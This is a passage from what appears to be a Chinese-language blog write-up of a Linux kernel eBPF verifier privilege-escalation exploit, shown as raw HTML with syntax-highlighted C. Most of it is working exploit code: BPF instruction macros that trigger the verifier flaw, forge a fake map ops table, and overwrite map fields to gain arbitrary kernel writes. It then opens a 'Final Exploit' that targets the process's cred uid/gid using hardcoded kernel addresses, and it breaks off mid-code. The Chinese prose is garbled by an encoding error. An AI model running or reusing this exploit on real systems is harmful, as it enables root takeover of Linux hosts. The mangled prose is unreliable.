class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_update_value</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> fd f, <span class="hljs-type">void</span> *key,</span><br><span class="hljs-params"><span class="hljs-type">void</span> *value, __u64 flags)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||<br>   <span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="hljs-built_in">map</span>, value, flags);<br></code></pre></td></tr></table></figure><p>ä¸è¿‡åœ¨æˆ‘ä»¬è°ƒç”¨ <code>bpf_map_update_value()</code> æ—¶è¿˜æœ‰ä¸€ä¸ªæ£€æŸ¥ï¼Œè‹¥ flags è®¾ç½®äº† <code>BPF_F_LOCK</code> æ ‡å¿—ä½ï¼Œåˆ™ä¼šæ£€æŸ¥ <code>map-&gt;spin_lock_off</code> æ˜¯å¦å¤§äºç­‰äº 0ï¼Œè‹¥éåˆ™ä¼šç›´æ¥æŠ¥é”™è¿”å›ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬è¿˜è¦å°†è¯¥å­—æ®µæ”¹ä¸ºä¸€ä¸ªæ­£æ•´æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* flags for BPF_MAP_UPDATE_ELEM command */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>BPF_ANY= <span class="hljs-number">0</span>, <span class="hljs-comment">/* create new element or update existing */</span><br>BPF_NOEXIST= <span class="hljs-number">1</span>, <span class="hljs-comment">/* create new element if it didn&#x27;t exist */</span><br>BPF_EXIST= <span class="hljs-number">2</span>, <span class="hljs-comment">/* update existing element */</span><br>BPF_F_LOCK= <span class="hljs-number">4</span>, <span class="hljs-comment">/* spin_lock-ed map_lookup/map_update */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> map_value_has_spin_lock(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>-&gt;spin_lock_off &gt;= <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_update_elem</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> ((attr-&gt;flags &amp; BPF_F_LOCK) &amp;&amp;<br>    !map_value_has_spin_lock(<span class="hljs-built_in">map</span>)) &#123;<br>err = -EINVAL;<br><span class="hljs-keyword">goto</span> err_put;<br>&#125;<br><br><span class="hljs-comment">//...</span><br>err = bpf_map_update_value(<span class="hljs-built_in">map</span>, f, key, value, attr-&gt;flags);<br></code></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬çš„ä»»æ„å†™æ–¹æ¡ˆå¦‚ä¸‹ï¼šæˆ‘ä»¬å¯ä»¥åœ¨ <code>bpf_array.value</code> ä¸Šæ„é€ ä¸€ä¸ª fake ops å°† <code>ops-&gt;map_push_elem</code> æ›¿æ¢ä¸º <code>array_map_get_next_key()</code> ï¼Œä¹‹åæ›¿æ¢æ‰ map çš„å‡½æ•°è¡¨ï¼Œå¹¶æ›´æ”¹ <code>map.max_entries</code> ä¸º <code>0xffffffff</code> ã€æ›´æ”¹ map ç±»å‹ä¸º  <code>BPF_MAP_TYPE_STACK</code> ã€æ›´æ”¹ <code>map.spin_lock_off</code> ä¸ºæ­£æ•°æ¥å®ç°ä»»æ„åœ°å€å†™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>å•æ¬¡åªèƒ½å†™ 4 å­—èŠ‚</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h2><p>æœ€åçš„ exp å¦‚ä¸‹ï¼Œå› ä¸ºåœ¨ <code>array_map_get_next_key()</code> ä¸­ä¼šæ£€æŸ¥ <code>index != max_entries - 1</code> ï¼Œè€Œ <code>init_cred</code> çš„é«˜ 32 ä½å¿…å®šæ˜¯ <code>0xFFFFFFFF</code> ï¼Œå› æ­¤è¿™é‡Œç¬”è€…é€‰æ‹©ç›´æ¥æ”¹å†™å½“å‰è¿›ç¨‹çš„ <code>task_struct.cred</code> çš„ uid ä¸ gid ç›¸å…³å­—æ®µï¼š</p><blockquote><p>æ³¨ï¼šè¿™é‡Œç¬”è€…å°†å¸¸ç”¨å‡½æ•° &amp; æŒ‡ä»¤å°è£…åœ¨äº† <a href="/download/bpf_tools.h">bpf_tools.h</a> ä¸­</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_tools.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_OPS   0xffffffff822363e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_GET_NEXT_KEY 0xffffffff81239c80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_TASK       0xffffffff82e1b400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED       0xffffffff82e88f20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAP_SIZE 0x2000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG    BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title 